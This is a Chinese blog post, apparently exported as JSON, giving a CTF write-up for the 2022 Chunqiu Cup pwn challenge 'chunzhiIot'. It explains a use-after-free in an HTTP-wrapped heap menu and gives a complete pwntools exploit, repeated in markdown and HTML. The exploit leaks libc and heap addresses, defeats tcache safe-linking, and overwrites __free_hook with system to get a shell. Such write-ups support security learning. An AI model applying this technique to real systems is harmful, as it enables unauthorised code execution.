{"title":"[2022春秋杯] Pwn chunzhiIot wp","date":"2022-05-08T17:02:18.000Z","toc":true,"source":"_posts/2022cqb-pwn-chunzhiIot.md","raw":"---\ntitle: \"[2022春秋杯] Pwn chunzhiIot wp\"\ncomments: true\ntoc: true\ndate: 2022-05-09 01:02:18\ntags: \n  - CTF\n  - Pwn\n  - 春秋杯\n---\n\n# 题目\n\nhttps://gitee.com/csomebro/ctftask/blob/master/2022-05_%E6%98%A5%E7%A7%8B%E6%9D%AF/chunzhiIot.zip\n\n# 解题\n\n简单的UAF堆题，套上了一个解析Http请求的背景，首先需要逆向找到合适的构造http请求头的方法，找到堆题经典增删查改的函数，发现删除操作中没有清空指针。故可以UAF。\n\n![image-20220509010547875](2022cqb-pwn-chunzhiIot/image-20220509010547875.png)\n\n有个小细节libc 2.33之后tcache bin的fd指针加了一层加密，需要多泄露堆地址。\n\n![image-20220509010931252](2022cqb-pwn-chunzhiIot/image-20220509010931252.png)\n\n![image-20220509011033291](2022cqb-pwn-chunzhiIot/image-20220509011033291.png)\n\n# Exp\n\n```python\nfrom pwn import *\n\ncontext.log_level='debug'\n\nLOCAL = 1\ngetIO = (lambda : process(['./ld-2.33.so','./pwn'], env={'LD_PRELOAD':'./libc.so'})) if LOCAL else (lambda : remote('101.200.198.40',40629))\n\nlibc = ELF('./libc.so')\n\nio = getIO()\n\ndef http(op, content):\n    s = '{0} /s HTTP/1.0\\r\\n'.format(op)\n    s += 'a:a\\r\\n'*14\n    s += content\n    return s\n\ndef add(_id, size, content):\n    s = '\\x01&{0}&{1}&{2}'.format(_id, size, content)\n    io.sendafter('Waiting Package...\\n',http('POST', s))\n\ndef show(_id):\n    s = '\\x03&{0}'.format(_id)\n    io.sendafter('Waiting Package...\\n',http('POST', s))\n\ndef delete(_id):\n    s = '\\x04&{0}'.format(_id)\n    io.sendafter('Waiting Package...\\n',http('POST', s))\n\ndef edit(_id, content):\n    s = '\\x02&{0}&{1}'.format(_id, content)\n    io.sendafter('Waiting Package...\\n',http('POST', s))\n\nio.sendafter('Waiting Package...\\n',http('DEV', 'rotartsinimda'))\n# io.sendline()\nadd(0, 0x420, 'aaaaaa')\nadd(1, 0x20, 'aaaaaa')\n# add(14, 0x420, 'aaaaa')\n# add(15, 0x420, 'aaaaa')\ndelete(0)\nadd(2, 0x1, '\\x01\\x00')\nshow(2)\n\nio.recvuntil('Content-Length: ')\nio.recvuntil('\\n')\nmain_arena = u64(io.recv(6).ljust(8, '\\x00')) - 865\nlog.success('main_arena:'+hex(main_arena))\nlibc_base = main_arena - 1969056\nlog.success('libc_base:'+hex(libc_base))\n\nadd(3, 0x10, 'aaaaa')\nadd(4, 0x10, 'aaaaa')\n\ndelete(2)\nadd(5, 0x10, 'a'*0x10)\nshow(5)\n\nio.recvuntil('Content-Length: ')\nio.recvuntil('\\n')\nio.recvuntil('aaaaaaaaaaaaaaaa')\nheap_addr = u64(io.recv(6).ljust(8, '\\x00'))\nlog.success('heap_addr:'+hex(heap_addr))\n\ndelete(4)\ndelete(3)\n\ndef encode(addr, tar): # attack PROTECT_PTR\n    return (addr >> 12) ^ tar\n\nedit(3, p64(encode(heap_addr+0x30,libc.sym['__free_hook']+libc_base))+'\\x00')\n\nogg = [0xde78c,0xde78f,0xde792]\nadd(6, 0x10, '/bin/sh\\x00')\nadd(7, 0x8, p64(libc.sym['system']+libc_base)+'\\x00')\n\ngdb.attach(io)\n# add(6, 0x1, 'a')\ndelete(6)\n\n\nio.interactive()\n```\n\n第一次pwn题三血，纪念一下\n\n![55b9e32e2405a1300dd7020c6ceea0f](2022cqb-pwn-chunzhiIot/55b9e32e2405a1300dd7020c6ceea0f.png)","slug":"2022cqb-pwn-chunzhiIot","published":true,"updated":"2025-10-28T08:00:40.724Z","_id":"cuidF_7QaiKfLxVP9SRlwPfbQ","comments":true,"layout":"post","photos":[],"html":"<h1 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h1><p><a href=\"https://gitee.com/csomebro/ctftask/blob/master/2022-05_%E6%98%A5%E7%A7%8B%E6%9D%AF/chunzhiIot.zip\">https://gitee.com/csomebro/ctftask/blob/master/2022-05_%E6%98%A5%E7%A7%8B%E6%9D%AF/chunzhiIot.zip</a></p>\n<h1 id=\"解题\"><a href=\"#解题\" class=\"headerlink\" title=\"解题\"></a>解题</h1><p>简单的UAF堆题，套上了一个解析Http请求的背景，首先需要逆向找到合适的构造http请求头的方法，找到堆题经典增删查改的函数，发现删除操作中没有清空指针。故可以UAF。</p>\n<p><img src=\"/p/2022cqb-pwn-chunzhiIot/image-20220509010547875.png\" alt=\"image-20220509010547875\"></p>\n<p>有个小细节libc 2.33之后tcache bin的fd指针加了一层加密，需要多泄露堆地址。</p>\n<p><img src=\"/p/2022cqb-pwn-chunzhiIot/image-20220509010931252.png\" alt=\"image-20220509010931252\"></p>\n<p><img src=\"/p/2022cqb-pwn-chunzhiIot/image-20220509011033291.png\" alt=\"image-20220509011033291\"></p>\n<h1 id=\"Exp\"><a href=\"#Exp\" class=\"headerlink\" title=\"Exp\"></a>Exp</h1><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">LOCAL = <span class=\"number\">1</span></span><br><span class=\"line\">getIO = (<span class=\"keyword\">lambda</span> : process([<span class=\"string\">&#x27;./ld-2.33.so&#x27;</span>,<span class=\"string\">&#x27;./pwn&#x27;</span>], env=&#123;<span class=\"string\">&#x27;LD_PRELOAD&#x27;</span>:<span class=\"string\">&#x27;./libc.so&#x27;</span>&#125;)) <span class=\"keyword\">if</span> LOCAL <span class=\"keyword\">else</span> (<span class=\"keyword\">lambda</span> : remote(<span class=\"string\">&#x27;101.200.198.40&#x27;</span>,<span class=\"number\">40629</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc.so&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io = getIO()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">http</span>(<span class=\"params\">op, content</span>):</span><br><span class=\"line\">    s = <span class=\"string\">&#x27;&#123;0&#125; /s HTTP/1.0\\r\\n&#x27;</span>.<span class=\"built_in\">format</span>(op)</span><br><span class=\"line\">    s += <span class=\"string\">&#x27;a:a\\r\\n&#x27;</span>*<span class=\"number\">14</span></span><br><span class=\"line\">    s += content</span><br><span class=\"line\">    <span class=\"keyword\">return</span> s</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">_<span class=\"built_in\">id</span>, size, content</span>):</span><br><span class=\"line\">    s = <span class=\"string\">&#x27;\\x01&amp;&#123;0&#125;&amp;&#123;1&#125;&amp;&#123;2&#125;&#x27;</span>.<span class=\"built_in\">format</span>(_<span class=\"built_in\">id</span>, size, content)</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&#x27;Waiting Package...\\n&#x27;</span>,http(<span class=\"string\">&#x27;POST&#x27;</span>, s))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">_<span class=\"built_in\">id</span></span>):</span><br><span class=\"line\">    s = <span class=\"string\">&#x27;\\x03&amp;&#123;0&#125;&#x27;</span>.<span class=\"built_in\">format</span>(_<span class=\"built_in\">id</span>)</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&#x27;Waiting Package...\\n&#x27;</span>,http(<span class=\"string\">&#x27;POST&#x27;</span>, s))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">_<span class=\"built_in\">id</span></span>):</span><br><span class=\"line\">    s = <span class=\"string\">&#x27;\\x04&amp;&#123;0&#125;&#x27;</span>.<span class=\"built_in\">format</span>(_<span class=\"built_in\">id</span>)</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&#x27;Waiting Package...\\n&#x27;</span>,http(<span class=\"string\">&#x27;POST&#x27;</span>, s))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">_<span class=\"built_in\">id</span>, content</span>):</span><br><span class=\"line\">    s = <span class=\"string\">&#x27;\\x02&amp;&#123;0&#125;&amp;&#123;1&#125;&#x27;</span>.<span class=\"built_in\">format</span>(_<span class=\"built_in\">id</span>, content)</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&#x27;Waiting Package...\\n&#x27;</span>,http(<span class=\"string\">&#x27;POST&#x27;</span>, s))</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendafter(<span class=\"string\">&#x27;Waiting Package...\\n&#x27;</span>,http(<span class=\"string\">&#x27;DEV&#x27;</span>, <span class=\"string\">&#x27;rotartsinimda&#x27;</span>))</span><br><span class=\"line\"><span class=\"comment\"># io.sendline()</span></span><br><span class=\"line\">add(<span class=\"number\">0</span>, <span class=\"number\">0x420</span>, <span class=\"string\">&#x27;aaaaaa&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"number\">0x20</span>, <span class=\"string\">&#x27;aaaaaa&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># add(14, 0x420, &#x27;aaaaa&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># add(15, 0x420, &#x27;aaaaa&#x27;)</span></span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"number\">0x1</span>, <span class=\"string\">&#x27;\\x01\\x00&#x27;</span>)</span><br><span class=\"line\">show(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&#x27;Content-Length: &#x27;</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">main_arena = u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>)) - <span class=\"number\">865</span></span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;main_arena:&#x27;</span>+<span class=\"built_in\">hex</span>(main_arena))</span><br><span class=\"line\">libc_base = main_arena - <span class=\"number\">1969056</span></span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;libc_base:&#x27;</span>+<span class=\"built_in\">hex</span>(libc_base))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">3</span>, <span class=\"number\">0x10</span>, <span class=\"string\">&#x27;aaaaa&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">4</span>, <span class=\"number\">0x10</span>, <span class=\"string\">&#x27;aaaaa&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">delete(<span class=\"number\">2</span>)</span><br><span class=\"line\">add(<span class=\"number\">5</span>, <span class=\"number\">0x10</span>, <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x10</span>)</span><br><span class=\"line\">show(<span class=\"number\">5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&#x27;Content-Length: &#x27;</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&#x27;aaaaaaaaaaaaaaaa&#x27;</span>)</span><br><span class=\"line\">heap_addr = u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;heap_addr:&#x27;</span>+<span class=\"built_in\">hex</span>(heap_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">delete(<span class=\"number\">4</span>)</span><br><span class=\"line\">delete(<span class=\"number\">3</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">encode</span>(<span class=\"params\">addr, tar</span>): <span class=\"comment\"># attack PROTECT_PTR</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> (addr &gt;&gt; <span class=\"number\">12</span>) ^ tar</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">3</span>, p64(encode(heap_addr+<span class=\"number\">0x30</span>,libc.sym[<span class=\"string\">&#x27;__free_hook&#x27;</span>]+libc_base))+<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">ogg = [<span class=\"number\">0xde78c</span>,<span class=\"number\">0xde78f</span>,<span class=\"number\">0xde792</span>]</span><br><span class=\"line\">add(<span class=\"number\">6</span>, <span class=\"number\">0x10</span>, <span class=\"string\">&#x27;/bin/sh\\x00&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">7</span>, <span class=\"number\">0x8</span>, p64(libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]+libc_base)+<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">gdb.attach(io)</span><br><span class=\"line\"><span class=\"comment\"># add(6, 0x1, &#x27;a&#x27;)</span></span><br><span class=\"line\">delete(<span class=\"number\">6</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>第一次pwn题三血，纪念一下</p>\n<p><img src=\"/p/2022cqb-pwn-chunzhiIot/55b9e32e2405a1300dd7020c6ceea0f.png\" alt=\"55b9e32e2405a1300dd7020c6ceea0f\"></p>\n","excerpt":"","more":"<h1 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h1><p><a href=\"https://gitee.com/csomebro/ctftask/blob/master/2022-05_%E6%98%A5%E7%A7%8B%E6%9D%AF/chunzhiIot.zip\">https://gitee.com/csomebro/ctftask/blob/master/2022-05_%E6%98%A5%E7%A7%8B%E6%9D%AF/chunzhiIot.zip</a></p>\n<h1 id=\"解题\"><a href=\"#解题\" class=\"headerlink\" title=\"解题\"></a>解题</h1><p>简单的UAF堆题，套上了一个解析Http请求的背景，首先需要逆向找到合适的构造http请求头的方法，找到堆题经典增删查改的函数，发现删除操作中没有清空指针。故可以UAF。</p>\n<p><img src=\"/p/2022cqb-pwn-chunzhiIot/image-20220509010547875.png\" alt=\"image-20220509010547875\"></p>\n<p>有个小细节libc 2.33之后tcache bin的fd指针加了一层加密，需要多泄露堆地址。</p>\n<p><img src=\"/p/2022cqb-pwn-chunzhiIot/image-20220509010931252.png\" alt=\"image-20220509010931252\"></p>\n<p><img src=\"/p/2022cqb-pwn-chunzhiIot/image-20220509011033291.png\" alt=\"image-20220509011033291\"></p>\n<h1 id=\"Exp\"><a href=\"#Exp\" class=\"headerlink\" title=\"Exp\"></a>Exp</h1><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">LOCAL = <span class=\"number\">1</span></span><br><span class=\"line\">getIO = (<span class=\"keyword\">lambda</span> : process([<span class=\"string\">&#x27;./ld-2.33.so&#x27;</span>,<span class=\"string\">&#x27;./pwn&#x27;</span>], env=&#123;<span class=\"string\">&#x27;LD_PRELOAD&#x27;</span>:<span class=\"string\">&#x27;./libc.so&#x27;</span>&#125;)) <span class=\"keyword\">if</span> LOCAL <span class=\"keyword\">else</span> (<span class=\"keyword\">lambda</span> : remote(<span class=\"string\">&#x27;101.200.198.40&#x27;</span>,<span class=\"number\">40629</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc.so&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io = getIO()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">http</span>(<span class=\"params\">op, content</span>):</span><br><span class=\"line\">    s = <span class=\"string\">&#x27;&#123;0&#125; /s HTTP/1.0\\r\\n&#x27;</span>.<span class=\"built_in\">format</span>(op)</span><br><span class=\"line\">    s += <span class=\"string\">&#x27;a:a\\r\\n&#x27;</span>*<span class=\"number\">14</span></span><br><span class=\"line\">    s += content</span><br><span class=\"line\">    <span class=\"keyword\">return</span> s</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">_<span class=\"built_in\">id</span>, size, content</span>):</span><br><span class=\"line\">    s = <span class=\"string\">&#x27;\\x01&amp;&#123;0&#125;&amp;&#123;1&#125;&amp;&#123;2&#125;&#x27;</span>.<span class=\"built_in\">format</span>(_<span class=\"built_in\">id</span>, size, content)</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&#x27;Waiting Package...\\n&#x27;</span>,http(<span class=\"string\">&#x27;POST&#x27;</span>, s))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">_<span class=\"built_in\">id</span></span>):</span><br><span class=\"line\">    s = <span class=\"string\">&#x27;\\x03&amp;&#123;0&#125;&#x27;</span>.<span class=\"built_in\">format</span>(_<span class=\"built_in\">id</span>)</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&#x27;Waiting Package...\\n&#x27;</span>,http(<span class=\"string\">&#x27;POST&#x27;</span>, s))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">_<span class=\"built_in\">id</span></span>):</span><br><span class=\"line\">    s = <span class=\"string\">&#x27;\\x04&amp;&#123;0&#125;&#x27;</span>.<span class=\"built_in\">format</span>(_<span class=\"built_in\">id</span>)</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&#x27;Waiting Package...\\n&#x27;</span>,http(<span class=\"string\">&#x27;POST&#x27;</span>, s))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">_<span class=\"built_in\">id</span>, content</span>):</span><br><span class=\"line\">    s = <span class=\"string\">&#x27;\\x02&amp;&#123;0&#125;&amp;&#123;1&#125;&#x27;</span>.<span class=\"built_in\">format</span>(_<span class=\"built_in\">id</span>, content)</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&#x27;Waiting Package...\\n&#x27;</span>,http(<span class=\"string\">&#x27;POST&#x27;</span>, s))</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendafter(<span class=\"string\">&#x27;Waiting Package...\\n&#x27;</span>,http(<span class=\"string\">&#x27;DEV&#x27;</span>, <span class=\"string\">&#x27;rotartsinimda&#x27;</span>))</span><br><span class=\"line\"><span class=\"comment\"># io.sendline()</span></span><br><span class=\"line\">add(<span class=\"number\">0</span>, <span class=\"number\">0x420</span>, <span class=\"string\">&#x27;aaaaaa&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"number\">0x20</span>, <span class=\"string\">&#x27;aaaaaa&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># add(14, 0x420, &#x27;aaaaa&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># add(15, 0x420, &#x27;aaaaa&#x27;)</span></span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"number\">0x1</span>, <span class=\"string\">&#x27;\\x01\\x00&#x27;</span>)</span><br><span class=\"line\">show(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&#x27;Content-Length: &#x27;</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">main_arena = u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>)) - <span class=\"number\">865</span></span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;main_arena:&#x27;</span>+<span class=\"built_in\">hex</span>(main_arena))</span><br><span class=\"line\">libc_base = main_arena - <span class=\"number\">1969056</span></span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;libc_base:&#x27;</span>+<span class=\"built_in\">hex</span>(libc_base))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">3</span>, <span class=\"number\">0x10</span>, <span class=\"string\">&#x27;aaaaa&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">4</span>, <span class=\"number\">0x10</span>, <span class=\"string\">&#x27;aaaaa&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">delete(<span class=\"number\">2</span>)</span><br><span class=\"line\">add(<span class=\"number\">5</span>, <span class=\"number\">0x10</span>, <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x10</span>)</span><br><span class=\"line\">show(<span class=\"number\">5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&#x27;Content-Length: &#x27;</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&#x27;aaaaaaaaaaaaaaaa&#x27;</span>)</span><br><span class=\"line\">heap_addr = u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;heap_addr:&#x27;</span>+<span class=\"built_in\">hex</span>(heap_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">delete(<span class=\"number\">4</span>)</span><br><span class=\"line\">delete(<span class=\"number\">3</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">encode</span>(<span class=\"params\">addr, tar</span>): <span class=\"comment\"># attack PROTECT_PTR</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> (addr &gt;&gt; <span class=\"number\">12</span>) ^ tar</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">3</span>, p64(encode(heap_addr+<span class=\"number\">0x30</span>,libc.sym[<span class=\"string\">&#x27;__free_hook&#x27;</span>]+libc_base))+<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">ogg = [<span class=\"number\">0xde78c</span>,<span class=\"number\">0xde78f</span>,<span class=\"number\">0xde792</span>]</span><br><span class=\"line\">add(<span class=\"number\">6</span>, <span class=\"number\">0x10</span>, <span class=\"string\">&#x27;/bin/sh\\x00&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">7</span>, <span class=\"number\">0x8</span>, p64(libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]+libc_base)+<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">gdb.attach(io)</span><br><span class=\"line\"><span class=\"comment\"># add(6, 0x1, &#x27;a&#x27;)</span></span><br><span class=\"line\">delete(<span class=\"number\">6</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>第一次pwn题三血，纪念一下</p>\n<p><img src=\"/p/2022cqb-pwn-chunzhiIot/55b9e32e2405a1300dd7020c6ceea0f.png\" alt=\"55b9e32e2405a1300dd7020c6ceea0f\"></p>\n","path":"/p/2022cqb-pwn-chunzhiIot/","permalink":"https://blog.csome.cc/p/2022cqb-pwn-chunzhiIot/","tags":[{"name":"CTF","_id":"cuido_V8Oh2SS0Zh3psZIuqJ6","slug":"CTF","path":"tags/CTF/","permalink":"https://blog.csome.cc/tags/CTF/","length":16},{"name":"Pwn","_id":"cuidf9SJlBoYLN5swxTldfoFK","slug":"Pwn","path":"tags/Pwn/","permalink":"https://blog.csome.cc/tags/Pwn/","length":16},{"name":"春秋杯","_id":"cuidj8t-8le0uDnsXMjmsVvQ0","slug":"春秋杯","path":"tags/春秋杯/","permalink":"https://blog.csome.cc/tags/%E6%98%A5%E7%A7%8B%E6%9D%AF/","length":1}],"categories":[],"prev":{"title":"[2022gdCTF]jmp_rsp midpwn easyheap WP","date":"2022-05-23T00:51:26.000Z","slug":"2022gdCTF-pwn","published":true,"updated":"2025-10-28T08:00:40.727Z","_id":"cuidszyli8RH7hK8cbX5G8Aag","layout":"post","photos":[],"excerpt":"","path":"/p/2022gdCTF-pwn/","permalink":"https://blog.csome.cc/p/2022gdCTF-pwn/","__post":true},"next":{"title":"[2022*CTF] Pwn examination 